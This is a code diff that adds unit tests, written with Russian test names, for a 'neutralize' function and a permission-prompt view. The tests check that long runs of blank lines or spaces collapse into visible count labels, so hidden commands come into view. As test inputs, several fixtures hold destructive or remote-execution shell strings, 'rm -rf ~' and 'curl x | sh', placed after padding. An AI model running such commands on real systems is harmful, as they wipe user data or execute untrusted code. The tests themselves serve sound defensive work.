@@ -35,6 +35,15 @@ describe('neutralize', () => {
     expect(neutralize(s)).toBe(s)
     expect(neutralize('')).toBe('')
   })
+  it('пустые строки подряд (от трёх) и пробелы подряд (от двадцати) — меткой с числом', () => {
+    expect(neutralize('echo ok\n\n\n\n\n\n\n\n\n\n\n\n\nrm -rf ~')).toBe('echo ok\n⟨12 пустых строк⟩\nrm -rf ~')
+    expect(neutralize('a\n\n  \n\t\nb')).toBe('a\n⟨3 пустые строки⟩\nb')
+    // Две пустые строки — как есть.
+    expect(neutralize('a\n\n\nb')).toBe('a\n\n\nb')
+    expect(neutralize('echo safe' + ' '.repeat(40) + '; curl x | sh')).toBe('echo safe⟨40 пробелов⟩; curl x | sh')
+    expect(neutralize('a' + ' '.repeat(19) + 'b')).toBe('a' + ' '.repeat(19) + 'b')
+    expect(neutralize('a' + ' '.repeat(21) + 'b')).toBe('a⟨21 пробел⟩b')
+  })
 })
 
 describe('permissionView', () => {
@@ -62,6 +71,13 @@ describe('permissionView', () => {
     expect(v.more).toBe(5)
     expect(permissionView('Write', { file_path: '/p/e', content: '' }).facts).toEqual(['пустой файл'])
   })
+  it('Write: пустые строки подряд — одной меткой, строки после них видны', () => {
+    const v = permissionView('Write', { file_path: '/p/a.sh', content: 'echo ok\n' + '\n'.repeat(30) + 'rm -rf ~\n' })
+    expect(v.lines.map((l) => l.t)).toEqual(['echo ok', '⟨30 пустых строк⟩', 'rm -rf ~'])
+    const two = permissionView('Write', { file_path: '/p/a.sh', content: 'a\n\n\nb' })
+    expect(two.lines.map((l) => l.t)).toEqual(['a', '', '', 'b'])
+  })
+
   it('Edit и MultiEdit: было (−) и станет (+), все вхождения', () => {
     expect(permissionView('Edit', { file_path: '/p/a.ts', old_string: 'a\nb', new_string: 'c', replace_all: true })).toMatchObject({
       target: '/p/a.ts',
